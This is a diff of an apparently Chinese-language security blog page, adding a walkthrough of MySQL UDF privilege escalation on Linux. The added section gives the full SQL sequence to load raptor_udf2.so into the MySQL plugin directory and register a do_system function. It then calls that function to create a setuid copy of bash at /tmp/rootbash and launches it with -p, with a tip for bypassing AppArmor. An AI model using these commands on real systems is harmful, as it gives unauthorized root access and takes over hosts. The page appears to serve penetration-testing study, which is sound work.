+<li>-soname,raptor_udf2.so：设置生成的共享库的 &ldquo;soname&rdquo;</li>
+<li>-lc：链接器链接标准 C 库</li>
+</ul>
+<h4 id="利用过程">利用过程</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> mysql;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">create</span> <span style="color:#66d9ef">table</span> <span style="color:#a6e22e">foo</span>(line <span style="color:#66d9ef">blob</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">insert</span> <span style="color:#66d9ef">into</span> foo <span style="color:#66d9ef">values</span>(<span style="color:#a6e22e">load_file</span>(<span style="color:#e6db74">&#39;home/user/tools/mysql-udf/raptor_udf2.so&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> foo <span style="color:#66d9ef">into</span> dumpfile <span style="color:#e6db74">&#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">create</span> function do_system returns <span style="color:#66d9ef">integer</span> <span style="color:#66d9ef">soname</span> <span style="color:#e6db74">&#39;raptor_udf2.so&#39;</span>;
+</span></span></code></pre></div><ul>
+<li>create table foo(line blob)：创建一个名为 &ldquo;foo&rdquo; 的表（table），包含名为 &ldquo;line&rdquo; 的列（column），数据类型为 BLOB。BLOB 表示 &ldquo;Binary Large Object&rdquo;，可以储存大量二进制数据。</li>
+<li>foo 在计算机编程和网络中是一个常用占位符的名称。</li>
+<li>create function do_system returns integer soname &lsquo;raptor_udf2.so&rsquo;：寻找 plugin 目录中的 .so 文件。</li>
+<li>如果 dumpfile 失败，对于 AppArmor 编辑 <code>/etc/apparmor.d/usr.sbin.mysqld </code>文件，找到以下行：<code>/usr/sbin/mysqld {</code>，在此行下方添 加以下内容： <code>/usr/lib/mysql/plugin/** rw</code>。</li>
+<li>删除 mysql 函数命令：<code>DROP FUNCTION IF EXISTS dosystem;</code>。</li>
+<li>查询已有 udf：<code>SELECT * FROM mysql.func;</code>。</li>
+</ul>
+<p>执行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#a6e22e">do_system</span>(<span style="color:#e6db74">&#39;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#39;</span>);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp/rootbash -p
+</span></span></code></pre></div><h3 id="可读-shadow-文件提权">可读 shadow 文件提权</h3>
 
       </div>
     </article>
@@ -505,7 +711,7 @@
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1442 Words
+        2186 Words
       </p>
 
       <p>
